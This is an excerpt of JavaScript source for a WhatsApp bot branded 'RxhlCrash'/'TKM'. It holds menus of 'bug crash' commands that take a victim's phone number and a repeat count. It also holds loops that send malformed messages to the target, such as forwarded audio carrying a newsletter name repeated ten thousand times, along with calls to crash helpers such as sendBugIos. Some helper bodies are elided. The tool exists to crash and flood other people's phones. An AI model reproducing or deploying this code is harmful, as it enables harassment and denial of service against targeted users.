...
let { key } = await rxhl.sendMessage(from, {text: 'ткм ѕℓαуєя...'})
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "RxhlCrash",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/81e9db8054a9f1b48199b.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `TKM is LORD 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@cod3Uchiha`}}}, { quoted:m})} 
...
\`Bug Crash Chat\`
•   
•   ${prefix}bugcrash *+263xxx*
•   ${prefix}bugsystem *+263xxx*
•   ${prefix}crash1jam *+263xxx*
•   ${prefix}crash1hari *+263xxx*
•   ${prefix}xreactpc *+263xxx*
•   ${prefix}bugiospc *+263xxx|Amount*
•   ${prefix}bugaudiopc *+263xxx|Amount*
•   ${prefix}buglocpc *+263xxx|Amount*
•   ${prefix}bugparamspc *+263xxx|Amount*
•   ${prefix}bughomepc *+263xxx|Amount*
•   ${prefix}bannedno *+263xxx*
•   ${prefix}bugvid1
•   ${prefix}bugvid2
•   
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
...
\`Bug Crash Emote\`
•   
•   ${prefix}🔥  *+263xxx|Amount*
•   ${prefix}♥️  *+263xxx|Amount*
•   ${prefix}🥰  *+263xxx|Amount*
•   ${prefix}🤤  *+263xxx|Amount*
•   ${prefix}😱  *+263xxx|Amount*
•   ${prefix}💝  *+263xxx|Amount*
...
\`Special Bug\`
•   
•   ${prefix}rxhlbug *263xxx|Amount*
•   ${prefix}tkill *263xxx|Amount*
•   ${prefix}rxhlganteng *263xxx|Amount*
•   ${prefix}slay-ios *263xxx|Amount*
•   ${prefix}slay-android *263xxx|Amount*
•   
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

\`Other Menu \`
•   ${prefix}bannedno *263xxxx*
...
\`Bug Crash Chat V2\`
•   
•   ${prefix}iosfull *+263xxx|Amount*
•   ${prefix}iosfullv2 *+263xxx|Amount*
•   ${prefix}samsungcrash *+263xxx|Amount*
•   ${prefix}samsungfull *+263xxx|Amount*
•   ${prefix}samsung-brutal *+263xxx|Amount*
•   ${prefix}slayer07 *+263xxx|Amount*
•   ${prefix}darkness *+263xxx|Amount*
•   ${prefix}virkon *+263xxx|Amount*
•   ${prefix}virgam *+263xxx|Amount*
•   ${prefix}fatal-ui *+263xxx|Amount*
•   ${prefix}fatal-notif *+263xxx|Amount*
•   ${prefix}bug-brutal *+263xxx|Amount*
•   ${prefix}crash-all-dvc *+263xxx|Amount*
•   
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
...
\`Bug Crash Chat V3\`
•   
•   ${prefix}all-dvc2 *+263xxx*
•   ${prefix}killwhatsapp *+263xxx*
•   ${prefix}auto-crash *+263xxx*
•   ${prefix}new-bunga *+263xxx*
•   ${prefix}kill-ripper *+263xxx*
•   ${prefix}external-crash1 *+263xxx*
•   ${prefix}external-crash2 *+263xxx*
•   ${prefix}external-crash3 *+263xxx*
•   ${prefix}internal-crash1 *+263xxx*
•   ${prefix}internal-crash2 *+263xxx*
•   ${prefix}onlyios-crash *+263xxx*
•   ${prefix}onlysamsung-crash *+263xxx*
•   
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
...
\`Bug Andro / IP VIP\`
•   
•   ${prefix}bug-vip *+263xxx*
•   ${prefix}super-vip *+263xxx*
•   ${prefix}samsung-vip *+263xxx*
•   ${prefix}oppo-vip *+263xxx*
•   ${prefix}vivo-vip *+263xxx*
•   ${prefix}xiaomi-vip *+263xxx*
•   ${prefix}infinix-vip *+263xxx*
•   ${prefix}tecno-vip *+263xxx*
•   ${prefix}jids-engine *+263xxx*
•   ${prefix}jids-internal *+263xxx*
•   ${prefix}jids-external *+263xxx*
•   ${prefix}jids-system *+263xxx*
•   ${prefix}ipcrash *+263xxx*
•   
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
...
rxhl.sendMessage(from, { caption: `ℓσя∂ ткм!`, video: { url: data.watermark }}, {quoted:m})
})}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `ℓσя∂ ткм`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `ℓσя∂ ткм`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
case 'rxhlbug': case 'tkill': case 'rxhlganteng': case 'slay-ios': case 'slay-android':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
...
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY ℓσя∂ ткм`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
